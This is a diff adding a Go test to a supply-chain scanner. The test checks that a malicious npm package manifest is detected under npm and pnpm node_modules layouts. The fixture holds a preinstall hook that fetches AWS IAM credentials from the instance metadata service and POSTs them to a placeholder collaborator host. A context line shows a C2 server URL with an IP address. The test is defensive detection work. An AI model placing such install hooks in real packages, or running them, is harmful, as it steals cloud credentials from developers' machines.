@@ -344,6 +344,54 @@ const C2_URL = process.env.C2_URL || "http://149.28.127.35:8888";
 	}
 }
 
+// TestScan_AmazonInspectorNotafollowerUnderNodeModules proves the bounded
+// walker reaches the malicious lifecycle manifest in npm and pnpm layouts
+// without scanning a lookalike package carrying the same IMDS markers.
+func TestScan_AmazonInspectorNotafollowerUnderNodeModules(t *testing.T) {
+	raw := []byte(`{"name":"notafollower","scripts":{"preinstall":"node -e \"fetch('http://169.254.169.254/latest/api/token',{method:'PUT'}).then(()=>fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/')).then(()=>fetch('https://YOUR_COLLAB/?real_aws_keys=1',{method:'POST'}))\"","postinstall":"npm run preinstall"}}`)
+	layouts := []struct {
+		name string
+		rel  string
+	}{
+		{"npm", filepath.Join("node_modules", "notafollower", "package.json")},
+		{"pnpm", filepath.Join("node_modules", ".pnpm", "notafollower@1.0.4", "node_modules", "notafollower", "package.json")},
+	}
+	for _, layout := range layouts {
+		t.Run(layout.name, func(t *testing.T) {
+			root := t.TempDir()
+			payload := filepath.Join(root, layout.rel)
+			if err := os.MkdirAll(filepath.Dir(payload), 0o755); err != nil {
+				t.Fatal(err)
+			}
+			if err := os.WriteFile(payload, raw, 0o644); err != nil {
+				t.Fatal(err)
+			}
+
+			lookalike := filepath.Join(root, "node_modules", "other-package", "package.json")
+			if err := os.MkdirAll(filepath.Dir(lookalike), 0o755); err != nil {
+				t.Fatal(err)
+			}
+			if err := os.WriteFile(lookalike, raw, 0o644); err != nil {
+				t.Fatal(err)
+			}
+
+			res, err := scan.Run(context.Background(), scan.Options{Roots: []string{root}})
+			if err != nil {
+				t.Fatalf("scan: %v", err)
+			}
+			got := 0
+			for _, f := range res.Findings {
+				if f.RuleID == "amazon-inspector-npm-malware-ioc" {
+					got++
+				}
+			}
+			if got != 1 {
+				t.Fatalf("amazon-inspector-npm-malware-ioc findings = %d, want 1; findings=%+v", got, res.Findings)
+			}
+		})
+	}
+}
+
 // TestScan_TelekomODSReactUIKitUnderNodeModules proves the bounded walker
 // reaches the compromised package manifest in npm and pnpm layouts without
 // scanning a lookalike package carrying the same exfiltration markers.
